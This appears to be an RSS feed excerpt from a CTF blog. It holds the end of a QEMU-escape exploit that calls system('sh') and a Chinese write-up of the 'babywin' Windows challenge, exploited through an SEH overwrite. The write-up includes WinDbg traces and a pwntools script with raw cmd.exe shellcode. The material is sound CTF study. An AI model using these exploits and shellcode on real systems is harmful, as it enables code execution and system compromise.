class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* mmio;</span><br><span class="line"><span class="type">uint32_t</span> port_base = <span class="number">0xc000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> port, <span class="type">uint32_t</span> val)</span> &#123;</span><br><span class="line">        outl(val, port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> port)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">        *(<span class="type">uint64_t</span>*)(mmio + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">uint64_t</span>*)(mmio + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;I/O permission is not enough\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mmio_fd =</span><br><span class="line">        open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    mmio = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">uint64_t</span> u64cmd;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* cmd = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line">        <span class="built_in">strcpy</span>(&amp;u64cmd, cmd); </span><br><span class="line"></span><br><span class="line">        mmio_write(<span class="number">0</span>, <span class="number">666</span>);</span><br><span class="line">        <span class="type">uint32_t</span> num = pmio_read(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        mmio_write(<span class="number">0x80</span>, <span class="number">0x100</span>);</span><br><span class="line">        <span class="type">uint64_t</span> libc_base = mmio_read(<span class="number">0x14</span>) - <span class="number">0x1e780</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;libc_base:\t0x%llx\n&quot;</span>, libc_base);</span><br><span class="line">        <span class="keyword">if</span> (libc_base == <span class="number">0</span> || (libc_base &amp; <span class="number">0xFFF</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint64_t</span> system_addr = libc_base + <span class="number">0x28d70</span>;</span><br><span class="line">        pmio_write(<span class="number">0x14</span>, system_addr &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">        pmio_write(<span class="number">0x18</span>, system_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">        mmio_write(<span class="number">0x40</span>, u64cmd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">qemu-escape</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="qemu-escape" scheme="https://ixout.github.io/tags/qemu-escape/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑babywin复现</title>
    <link href="https://ixout.github.io/posts/57890/"/>
    <id>https://ixout.github.io/posts/57890/</id>
    <published>2024-04-15T15:18:04.000Z</published>
    <updated>2024-04-21T07:37:25.095Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目给的附件有三个文件,一个exe,两个dll</p><p>先对exe进行checksec</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-16_161739.png" alt=""></p><p>比较重要的几个</p><ul><li>没有栈不可执行</li><li>存在(GS)canary</li><li>没有地址随机化</li></ul><p>ida打开exe分析,程序是32位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">sub_401060</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v2; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line">  <span class="type">char</span> *Buffer; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="type">const</span> <span class="type">void</span> *)gift();</span><br><span class="line">  Buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>u);</span><br><span class="line">  output(<span class="string">&quot;your gift: %p\n&quot;</span>, v2);</span><br><span class="line">  output(<span class="string">&quot;give your data:&quot;</span>);</span><br><span class="line">  v0 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  fgets(Buffer, <span class="number">200</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> overflow(Buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">overflow</span><span class="params">(<span class="type">char</span> *Source)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">32</span>]; <span class="comment">// [esp+0h] [ebp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(Destination, Source);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcat</span>(Destination, Source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以明显地发现一个溢出漏洞,如果在linux平台下这就是最简单的栈溢出了</p><p>但在windows环境下,不太熟悉</p><h1 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">your gift: 00000009</span><br><span class="line">give your data:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p><code>your gift</code>没啥用,只是加载了<code>gift.dll</code>模块</p><p>data我们先尝试随便输点东西</p><p>结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(a7c<span class="number">.3314</span>): Access violation - code <span class="title function_">c0000005</span> <span class="params">(first chance)</span></span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=<span class="number">0000000</span>a ebx=<span class="number">002f</span>5000 ecx=<span class="number">61616161</span> edx=<span class="number">7</span>efeff09 esi=<span class="number">005646</span>c8 edi=<span class="number">0019f</span>f5d</span><br><span class="line">eip=<span class="number">762</span>ec8b1 esp=<span class="number">0019f</span>ed8 ebp=<span class="number">0019f</span>f0c iopl=<span class="number">0</span>         nv up ei pl nz na po nc</span><br><span class="line">cs=<span class="number">0023</span>  ss=<span class="number">002b</span>  ds=<span class="number">002b</span>  es=<span class="number">002b</span>  fs=<span class="number">0053</span>  gs=<span class="number">002b</span>             efl=<span class="number">00010202</span></span><br><span class="line">ucrtbase!<span class="built_in">strcat</span>+<span class="number">0x71</span>:</span><br><span class="line"><span class="number">762</span>ec8b1 <span class="number">8</span>a11            mov     dl,byte ptr [ecx]          ds:<span class="number">002b</span>:<span class="number">61616161</span>=??</span><br></pre></td></tr></table></figure><p>在strcat函数内出错了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">overflow</span><span class="params">(<span class="type">char</span> *Source)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">32</span>]; <span class="comment">// [esp+0h] [ebp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(Destination, Source);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcat</span>(Destination, Source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这其中存在栈溢出,一开始还想不太通为啥会出错,然后突然意识到这是32位的程序,参数通过栈传递的,那么溢出就已经把栈中保存的参数给覆盖了</p><hr><p>看到程序没有开启NX又没有后门的情况下</p><p>第一时间想到的是ret2shellcode,但有两个问题:</p><ol><li>没有这样的gadget可供使用</li><li>canary的存在</li></ol><p>这都是在已有的条件下无法解决的问题</p><p>此时就需要利用windows下的SEH机制了,<strong>SEH链是保存在栈中的</strong>,发生异常时,会遍历SEH中的处理函数直到找到可以处理的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; !teb</span><br><span class="line">TEB at <span class="number">002f</span>8000</span><br><span class="line">    ExceptionList:        <span class="number">0019f</span>f60</span><br><span class="line">    StackBase:            <span class="number">001</span>a0000</span><br><span class="line">    StackLimit:           <span class="number">0019</span>d000</span><br><span class="line">    SubSystemTib:         <span class="number">00000000</span></span><br><span class="line">    FiberData:            <span class="number">00001e00</span></span><br><span class="line">    ArbitraryUserPointer: <span class="number">00000000</span></span><br><span class="line">    Self:                 <span class="number">002f</span>8000</span><br><span class="line">    EnvironmentPointer:   <span class="number">00000000</span></span><br><span class="line">    ClientId:             <span class="number">00000</span>a7c . <span class="number">00003314</span></span><br><span class="line">    RpcHandle:            <span class="number">00000000</span></span><br><span class="line">    Tls Storage:          <span class="number">00564</span>d30</span><br><span class="line">    PEB Address:          <span class="number">002f</span>5000</span><br><span class="line">    LastErrorValue:       <span class="number">0</span></span><br><span class="line">    LastStatusValue:      <span class="number">0</span></span><br><span class="line">    Count Owned Locks:    <span class="number">0</span></span><br><span class="line">    HardErrorMode:        <span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; dps <span class="number">0019f</span>f60 l2</span><br><span class="line"><span class="number">0019f</span>f60  <span class="number">0019f</span>fcc</span><br><span class="line"><span class="number">0019f</span>f64  <span class="number">00401b</span>28 babywin+<span class="number">0x1b28</span></span><br></pre></td></tr></table></figure><p>如果我们溢出到该处那么就可以劫持异常处理流</p><p>我们下一个断点看看正常处理下会是怎样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">(<span class="number">27f</span>8<span class="number">.323</span>c): Access violation - code <span class="title function_">c0000005</span> <span class="params">(first chance)</span></span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=<span class="number">0019000</span>a ebx=<span class="number">002</span>d5000 ecx=<span class="number">61616161</span> edx=<span class="number">7f</span>17ff09 esi=<span class="number">005746e8</span> edi=<span class="number">0019f</span>f71</span><br><span class="line">eip=<span class="number">762</span>ec8b1 esp=<span class="number">0019f</span>ed8 ebp=<span class="number">0019f</span>f0c iopl=<span class="number">0</span>         nv up ei pl nz na po nc</span><br><span class="line">cs=<span class="number">0023</span>  ss=<span class="number">002b</span>  ds=<span class="number">002b</span>  es=<span class="number">002b</span>  fs=<span class="number">0053</span>  gs=<span class="number">002b</span>             efl=<span class="number">00010202</span></span><br><span class="line">ucrtbase!<span class="built_in">strcat</span>+<span class="number">0x71</span>:</span><br><span class="line"><span class="number">762</span>ec8b1 <span class="number">8</span>a11            mov     dl,byte ptr [ecx]          ds:<span class="number">002b</span>:<span class="number">61616161</span>=??</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dd esp l10</span><br><span class="line"><span class="number">0019f</span>ed8  <span class="number">0057b</span>8d0 <span class="number">0040110</span>d <span class="number">0019f</span>ee8 <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>ee8  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>ef8  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f08  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; d <span class="number">0019f</span>ee8 l20</span><br><span class="line"><span class="number">0019f</span>ee8  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>ef8  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f08  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f18  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f28  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f38  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f48  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f58  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br></pre></td></tr></table></figure><p>异常触发时,此时还是strcat函数的栈</p><p><code>0019fee8</code>是<code>dst</code>,<code>61616161</code>是<code>src</code>,显然后者不可访问,发生错误</p><p>继续跟进异常处理,如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line">eax=<span class="number">00000000</span> ebx=<span class="number">00000000</span> ecx=<span class="number">00401b</span>28 edx=<span class="number">77808</span>ad0 esi=<span class="number">00000000</span> edi=<span class="number">00000000</span></span><br><span class="line">eip=<span class="number">00401b</span>28 esp=<span class="number">0019f</span>918 ebp=<span class="number">0019f</span>938 iopl=<span class="number">0</span>         nv up ei pl zr na pe nc</span><br><span class="line">cs=<span class="number">0023</span>  ss=<span class="number">002b</span>  ds=<span class="number">002b</span>  es=<span class="number">002b</span>  fs=<span class="number">0053</span>  gs=<span class="number">002b</span>             efl=<span class="number">00000246</span></span><br><span class="line">babywin+<span class="number">0x1b28</span>:</span><br><span class="line"><span class="number">00401b</span>28 <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dd esp l20</span><br><span class="line"><span class="number">0019f</span>918  <span class="number">77808</span>ab2 <span class="number">0019f</span>a18 <span class="number">0019f</span>f60 <span class="number">0019f</span>a68</span><br><span class="line"><span class="number">0019f</span>928  <span class="number">0019f</span>9a4 <span class="number">0019f</span>f60 <span class="number">77808</span>ad0 <span class="number">0019f</span>f60</span><br><span class="line"><span class="number">0019f</span>938  <span class="number">0019f</span>a00 <span class="number">77808</span>a84 <span class="number">0019f</span>a18 <span class="number">0019f</span>f60</span><br><span class="line"><span class="number">0019f</span>948  <span class="number">0019f</span>a68 <span class="number">0019f</span>9a4 <span class="number">00401b</span>28 <span class="number">0019f</span>f60</span><br><span class="line"><span class="number">0019f</span>958  <span class="number">0019f</span>a18 <span class="number">00000000</span> <span class="number">777e92</span>ef <span class="number">0019f</span>a18</span><br><span class="line"><span class="number">0019f</span>968  <span class="number">0019f</span>f60 <span class="number">0019f</span>a68 <span class="number">0019f</span>9a4 <span class="number">00401b</span>28</span><br><span class="line"><span class="number">0019f</span>978  <span class="number">0019f</span>f35 <span class="number">00734588</span> <span class="number">0019f</span>a18 <span class="number">00000000</span></span><br><span class="line"><span class="number">0019f</span>988  <span class="number">0019f</span>a68 <span class="number">0019f</span>f60 <span class="number">00000032</span> <span class="number">0019</span>d000</span><br></pre></td></tr></table></figure><p>当执行到此处时,栈上会是这样一个状态,我们着重关注<code>esp+8</code>,发现其正好<strong>是当前的<code>ExceptionList</code></strong>(此时eip就由其handler决定),<u>而且这是一个距离可控栈比较近的地址</u></p><p>所以如果劫持这个handler为<code>pop ?;pop?;ret</code>那么就可以回到栈上执行shellcode</p><p>然后<code>0019ff60</code>处再写个jmp跳开handler指针,执行shellcode</p><p>不过这里还有一个问题,babywin开启了safeseh,所以我们需要找一个<u>没有开启该保护的模块</u>去找需要的gadget</p><p>发现<code>gift.dll</code>就刚好满足这个条件</p><p>而且能够找到不少gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x271f16ac pop ecx; pop ebp; ret</span><br><span class="line">0x271f1794 pop esi; pop ebp; ret</span><br><span class="line">0x271f19c9 pop esi; pop ebx; ret</span><br><span class="line">0x271f19f5 pop esi; pop ebx; ret</span><br><span class="line">0x271f1a84 pop esi; pop ebp; ret</span><br></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>我们只需要在检查gs之前,触发错误处理</p><p>就能够控制执行任意shellcode</p><p>先确认一下偏移,由之前的数据可以得知</p><p><code>offset=0x19ff60-0x19fee8=120</code></p><p>偏移确定,现在需要解决如何编写shellcode,不像linux平台下我们可以直接使用syscall来做一些系统级的调用方便getshell或者row</p><p>windows的shellcode编写更为复杂一点</p><p>不过好在我们可以直接借用某些工具,例如<a href="https://github.com/NytroRST/ShellcodeCompiler/tree/master">NytroRST/ShellcodeCompiler: Shellcode Compiler (github.com)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">WinExec</span><span class="params">(<span class="string">&quot;kernel32.dll&quot;</span>)</span>;</span><br><span class="line">function <span class="title function_">ExitProcess</span><span class="params">(<span class="string">&quot;kernel32.dll&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">WinExec(<span class="string">&quot;cmd.exe&quot;</span>,<span class="number">0</span>);</span><br><span class="line">ExitProcess(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>使用<code>.\ShellcodeCompiler_x86.exe -r .\source.txt -o shellcode.bin -a shellcode.asm -p win_x86</code>导出结果</p><p>还要注意需要二次读取足够的shellcode</p><p><strong>exp:(不懂为什么只有windbg调试的情况下,才能成功)</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">pop2 = <span class="number">0x271f16ac</span> <span class="comment">#: pop ecx ; pop ebp ; ret</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;192.168.137.1&quot;</span>,<span class="number">12978</span>)</span><br><span class="line"></span><br><span class="line">shell = <span class="string">b&#x27;1\xc9d\x8bA0\x8b@\x0c\x8bp\x14\xad\x96\xad\x8bX\x10\x8bS&lt;\x01\xda\x8bRx\x01\xda\x8br \x01\xde1\xc9A\xad\x01\xd8\x818GetPu\xf4\x81x\x04rocAu\xeb\x81x\x08ddreu\xe2\x8br$\x01\xdef\x8b\x0cNI\x8br\x1c\x01\xde\x8b\x14\x8e\x01\xda1\xc9SRQharyAhLibrhLoadTS\xff\xd2\x83\xc4\x0cYP1\xc0\xb8xec#P\x83l$\x03#hWinET\xfft$\x14\xffT$\x14\x83\xc4\x08P1\xc0\xb8ess#P\x83l$\x03#hProchExitT\xfft$\x1c\xffT$\x1c\x83\xc4\x0cP1\xc0\xb8exe#P\x83l$\x03#hcmd.T1\xc0P\xfft$\x04\xffT$\x18\x83\xc4\x0c1\xc0P\xffT$\x04&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="string">b&#x27;\n&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> shell)</span><br><span class="line"></span><br><span class="line"><span class="comment"># eip = p32(0x62616167)</span></span><br><span class="line"><span class="comment"># payload = b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#x27;</span></span><br><span class="line"><span class="comment"># offset = cyclic_find(payload,eip)</span></span><br><span class="line"><span class="comment"># success(&#x27;offset : &#x27; + hex(offset))</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov ecx,0x01010101</span></span><br><span class="line"><span class="string">    mov eax,0x14121bd           /*__acrt_iob_func*/</span></span><br><span class="line"><span class="string">    xor eax,ecx </span></span><br><span class="line"><span class="string">    mov ebx,[eax]</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    push ecx</span></span><br><span class="line"><span class="string">    call ebx</span></span><br><span class="line"><span class="string">    pop ecx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov ecx,0x01010101          /*fgets*/</span></span><br><span class="line"><span class="string">    push ecx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string">emmm:</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    test eax,eax</span></span><br><span class="line"><span class="string">    jnz read</span></span><br><span class="line"><span class="string">    call near ptr emmm</span></span><br><span class="line"><span class="string">read:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    sub ax,0x3010</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov eax,0x14121c1</span></span><br><span class="line"><span class="string">    xor eax,ecx</span></span><br><span class="line"><span class="string">    mov ebx,[eax]</span></span><br><span class="line"><span class="string">    call ebx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    jmp ebx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(shellcode)</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\xb9\x01\x01\x01\x01\xb8\xbd!A\x011\xc8\x8b\x181\xc9Q\xff\xd3YP\xb9\x01\x01\x01\x01Q1\xc0PX\x85\xc0u\x05\xe8\xf6\xff\xff\xfff-\x100P\xb8\xc1!A\x011\xc8\x8b\x18\xff\xd3[\xff\xe3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"><span class="keyword">assert</span>(<span class="string">b&#x27;\n&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> shellcode <span class="keyword">and</span> <span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> shellcode)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(shellcode) &lt; <span class="number">120</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line">pause()</span><br><span class="line">payload = shellcode.ljust(<span class="number">120</span>,<span class="string">b&#x27;\xAA&#x27;</span>) + <span class="string">b&#x27;\xeb\x86\xAA\xAA&#x27;</span> + p32(pop2) + <span class="string">b&#x27;cmd.exe&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;data:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;\xcc&#x27;</span> + shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者改为</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell = <span class="string">b&#x27;U\x8b\xec\x83\xec SVW\xc7E\xe8u\x00c\x00\xc7E\xecr\x00t\x00f\xc7E\xfccm\xc6E\xfed\xc7E\xe0systf\xc7E\xe4em\xc6E\xe6\x00d\xa10\x00\x00\x00\x83\xc0\x0c\x8b\x00\x89E\xf8\x8b&#125;\xf8\x83\xc7\x14\x8b\x17;\xd7t8\x8dd$\x00\x8br(\x8dM\xe83\xc0+\xf1\x8d\x9b\x00\x00\x00\x00\x8d\x0cFf\x8bL\r\xe8f;LE\xe8u\x06@\x83\xf8\x04|\xeb\x83\xf8\x04\x0f\x84\x82\x00\x00\x00\x8b\x12;\xd7u\xcc\x8b&#125;\xf8\x8bG&lt;3\xf6\x8b\\8x\x8bD;\x1c\x03\xdf\x03\xc7\x89E\xf0\x8bK 